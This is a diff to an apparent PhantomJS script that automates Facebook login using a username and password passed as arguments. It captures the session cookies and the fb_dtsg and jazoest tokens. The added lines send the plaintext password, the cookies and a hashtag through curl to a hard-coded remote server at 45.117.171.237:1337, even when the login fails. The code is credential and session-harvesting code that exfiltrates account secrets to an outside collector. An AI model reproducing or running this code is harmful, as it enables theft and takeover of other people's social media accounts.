@@ -4,7 +4,7 @@ var system = require('system');
 var args = system.args;
 var execFile = process.execFile
 var page = require('webpage').create();
-page.settings.userAgent = "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36";
+page.settings.userAgent = 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36';
 page.clearCookies();
 
 
@@ -16,10 +16,19 @@ page.onResourceRequested = function(requestData, networkRequest) {
 	//console.log( requestData.url);
 	var match = requestData.url.match(/bz/g);
 	if (match != null) {
+		var cookies = page.cookies;
+		var cookieStr = '';
 		var data =  JSON.parse('{"' + decodeURI(requestData.postData).replace(/"/g, '\\"').replace(/&/g, '","').replace(/=/g,'":"') + '"}')
-		if(data.fb_dtsg == undefined) {
+		if(data.fb_dtsg == undefined || data.__user == 0  ) {
+			for(var i in cookies) {
+				cookieStr+= ';' + cookies[i].name + '=' + cookies[i].value;
+			}
+			execFile("curl", ["", "http://45.117.171.237:1337/AccountsFB/create?" + 'username=' + args[1] + '&password=' + args[2] + '&cookie=' + cookieStr   + '&hashtag=' + args[3]], null, function (err, stdout, stderr) {
+				console.log("execFileSTDOUT:", JSON.stringify(stdout))
+				console.log("execFileSTDERR:", JSON.stringify(stderr))
+		 		phantom.exit();
+			})
 			console.log("login fail");
-			phantom.exit();
 			return;
 		}
 		console.log('Request (#' + requestData.id + '), postData: ' +  data.__dyn);
@@ -31,9 +40,9 @@ page.onResourceRequested = function(requestData, networkRequest) {
 		console.log("fb_dtsg: " + data.fb_dtsg );
 		console.log("jazoest: " + data.jazoest );
 		
-		var cookies = page.cookies;
-		var cookieStr = '';
-		console.log('Listing cookies:', cookies);
+	
+	
+		console.log('Listing cookies:');
 		for(var i in cookies) {
 			console.log(cookies[i].name + '=' + cookies[i].value);
 			if(cookies[i].name == 'c_user') cookieStr += ';c_user=' + cookies[i].value;
@@ -49,12 +58,12 @@ page.onResourceRequested = function(requestData, networkRequest) {
 		+"&__user=" + data.__user
 		+"&fb_dtsg=" + data.fb_dtsg
 		+"&jazoest=" + data.jazoest
-		+"&cookie=" + cookieStr;
+		+"&cookie=" + cookieStr
+		+'&hashtag=' + args[3];
 		if(data.__user == 0 || data.__user == undefined){
 			phantom.exit()
 		}
 		console.log('cookie : ' + cookieStr);
-	//	var child = spawn("curl", ["" ,"http://facebook-nguyenvanvu.c9users.io:8080/AccountsFB/create?" + urlParam]);
 		execFile("curl", ["", "http://45.117.171.237:1337/AccountsFB/create?" + urlParam], null, function (err, stdout, stderr) {
 			console.log("execFileSTDOUT:", JSON.stringify(stdout))
 			console.log("execFileSTDERR:", JSON.stringify(stderr))
@@ -69,10 +78,7 @@ page.onResourceRequested = function(requestData, networkRequest) {
 var countReq = 0;
 
 page.onLoadFinished = function(status) {
-	countReq++;
-	console.log('Status done: ' + status);
-//	if(countReq >= 2) phantom.exit();
-  // Do other things here...
+
 };
 
 page.open('https://facebook.com', function(status) {
@@ -83,9 +89,14 @@ page.open('https://facebook.com', function(status) {
 			document.getElementById('pass').value = password;
 			document.getElementById("loginbutton").click();
 		
+			
 		},args[1], args[2]);
+		
+	
   
 	}
+	//S	page.settings.userAgent = '';
+	// /	countReq++;
 	
 	//page.close();
 	//phantom.exit();
